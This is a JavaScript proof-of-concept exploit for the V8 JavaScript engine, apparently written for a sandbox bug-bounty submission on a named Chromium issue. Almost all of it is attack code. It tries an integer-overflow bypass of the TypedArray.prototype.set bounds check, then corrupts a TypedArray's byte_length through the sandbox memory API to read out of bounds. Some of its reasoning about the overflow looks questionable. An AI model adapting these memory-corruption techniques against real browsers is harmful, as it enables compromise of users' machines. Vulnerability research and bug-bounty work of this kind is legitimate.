// =============================================================================
// PoC: TypedArray.prototype.set Bounds Check Integer Overflow
// Target: Chromium issue 391169061
// Technique: Create large TypedArrays, use TypedArray.prototype.set() with a
//   carefully crafted offset that causes integer overflow in the bounds check,
//   achieving arbitrary address write (AAW) within the sandbox.
// Runtime: d8 --sandbox-fuzzing --allow-natives-syntax --expose-gc poc.js
// Category: V8 Sandbox Bug Bounty (authorized security research)
// =============================================================================

function require_feature(name, test) {
  if (!test) {
    print("[!] FATAL: required feature missing: " + name);
    quit(1);
  }
}

require_feature("Sandbox API", typeof Sandbox !== "undefined" && typeof Sandbox.MemoryView === "function");
require_feature("Sandbox.getAddressOf", typeof Sandbox.getAddressOf === "function");
require_feature("Sandbox.getSizeOf", typeof Sandbox.getSizeOf === "function");
require_feature("gc()", typeof gc === "function");

// --- Helpers ---
function addrof(obj) { return Sandbox.getAddressOf(obj); }
function sizeof(obj) { return Sandbox.getSizeOf(obj); }

function read64(sbxOffset) {
  const view = new Sandbox.MemoryView(sbxOffset, 8);
  const lo = view[0] | (view[1] << 8) | (view[2] << 16) | (view[3] << 24);
  const hi = view[4] | (view[5] << 8) | (view[6] << 16) | (view[7] << 24);
  return [lo >>> 0, hi >>> 0];
}

function write64(sbxOffset, lo, hi) {
  const view = new Sandbox.MemoryView(sbxOffset, 8);
  view[0] = lo & 0xff;         view[1] = (lo >> 8) & 0xff;
  view[2] = (lo >> 16) & 0xff; view[3] = (lo >> 24) & 0xff;
  view[4] = hi & 0xff;         view[5] = (hi >> 8) & 0xff;
  view[6] = (hi >> 16) & 0xff; view[7] = (hi >> 24) & 0xff;
}

function hex(val) { return "0x" + (val >>> 0).toString(16).padStart(8, "0"); }
function hex64(pair) { return hex(pair[1]) + hex(pair[0]).slice(2); }

function hexdump(sbxOffset, length) {
  const view = new Sandbox.MemoryView(sbxOffset, length);
  let lines = [];
  for (let i = 0; i < length; i += 16) {
    let hexPart = "";
    for (let j = 0; j < 16 && (i + j) < length; j++) {
      hexPart += view[i + j].toString(16).padStart(2, "0") + " ";
    }
    lines.push("  " + hex(sbxOffset + i) + ": " + hexPart.trim());
  }
  return lines.join("\n");
}

// --- Step 1: Allocate TypedArrays and examine their layout ---
print("[*] Allocating victim and source TypedArrays...");

// Victim: large Float64Array that we want to write OOB from
const VICTIM_LEN = 1024;
const victim = new Float64Array(VICTIM_LEN);
for (let i = 0; i < VICTIM_LEN; i++) victim[i] = 1.1;

// Source: small array with controlled data (marker pattern)
const SOURCE_LEN = 8;
const source = new Float64Array(SOURCE_LEN);
for (let i = 0; i < SOURCE_LEN; i++) {
  // Pack recognizable pattern: 0x4141414141414141 as float64
  const buf = new ArrayBuffer(8);
  const u8 = new Uint8Array(buf);
  u8.fill(0x41 + i);
  source[i] = new Float64Array(buf)[0];
}

const victimAddr = addrof(victim);
const sourceAddr = addrof(source);
const victimSize = sizeof(victim);

print("[*] victim: addr=" + hex(victimAddr) + " size=" + victimSize + " length=" + VICTIM_LEN);
print("[*] source: addr=" + hex(sourceAddr) + " length=" + SOURCE_LEN);

// --- Step 2: Examine TypedArray internal fields ---
print("[*] Dumping victim TypedArray header:");
print(hexdump(victimAddr, Math.min(victimSize, 64)));

// Read the backing store pointer and byte_length from the TypedArray
// JSTypedArray layout (compressed pointers, 64-bit):
//   +0x00: map
//   +0x04: properties_or_hash
//   +0x08: elements
//   +0x0c: buffer
//   +0x10: byte_offset (size_t)
//   +0x18: byte_length (size_t)
//   +0x20: length (size_t)
//   +0x28: base_pointer
//   +0x30: external_pointer

const byteLength = read64(victimAddr + 0x18);
const length = read64(victimAddr + 0x20);
print("[*] victim byte_length: " + hex64(byteLength));
print("[*] victim length: " + hex64(length));

// --- Step 3: Attempt integer overflow in TypedArray.prototype.set ---
print("[*] Attempting bounds check overflow via TypedArray.prototype.set()...");

// The bug (issue 391169061): when computing (offset + source.length),
// if both are large enough, the sum can overflow a 32-bit integer,
// wrapping to a small value that passes the bounds check.
// overflow_offset + SOURCE_LEN should wrap past 2^32 to a valid index.
const overflow_offset = 0x100000000 - SOURCE_LEN + 1; // wraps to 1 if 32-bit truncated

print("[*] Using overflow offset: " + hex(overflow_offset));
print("[*] offset + source.length = " + hex(overflow_offset + SOURCE_LEN) + " (should wrap to ~1)");

try {
  // This should throw RangeError if the bounds check is correct.
  // If the integer overflow bug exists, it will write source[] data
  // starting at byte offset (1 * 8) = 8 bytes into victim's backing store,
  // which is within bounds and proves the overflow occurred.
  victim.set(source, overflow_offset);
  print("[+] TypedArray.set() did NOT throw! Bounds check was bypassed.");
  print("[+] Integer overflow confirmed in bounds check.");

  // Verify the write landed
  print("[*] Checking if OOB write occurred...");
  for (let i = 0; i < 16; i++) {
    if (victim[i] !== 1.1) {
      print("[BYPASS] OOB write detected at victim[" + i + "] = " + victim[i]);
    }
  }
} catch (e) {
  if (e instanceof RangeError) {
    print("[!] RangeError thrown: bounds check is working correctly.");
    print("[!] Issue 391169061 appears to be patched in this build.");
  } else {
    print("[!] Unexpected error: " + e.constructor.name + ": " + e.message);
  }
}

// --- Step 4: Alternative approach - manipulate byte_length directly ---
print("[*] Alternative: attempting direct byte_length manipulation via MemoryView...");

const originalByteLen = read64(victimAddr + 0x18);
print("[*] Original byte_length: " + hex64(originalByteLen));

// Temporarily increase byte_length to allow OOB access
const newByteLen = [originalByteLen[0] + 0x1000, originalByteLen[1]];
write64(victimAddr + 0x18, newByteLen[0], newByteLen[1]);

const modifiedByteLen = read64(victimAddr + 0x18);
print("[*] Modified byte_length: " + hex64(modifiedByteLen));

// Check if we can read beyond original bounds
try {
  const oobIndex = VICTIM_LEN + 10;
  const oobVal = victim[oobIndex];
  if (oobVal !== undefined) {
    print("[+] OOB read succeeded: victim[" + oobIndex + "] = " + oobVal);
    print("[BYPASS] TypedArray bounds extended via sandbox memory corruption.");
  } else {
    print("[!] OOB read returned undefined.");
  }
} catch (e) {
  print("[!] OOB read failed: " + e.message);
}

// Restore original byte_length to avoid crashes
write64(victimAddr + 0x18, originalByteLen[0], originalByteLen[1]);
print("[*] Restored original byte_length.");

gc();
print("[*] TypedArray bounds overflow PoC completed.");
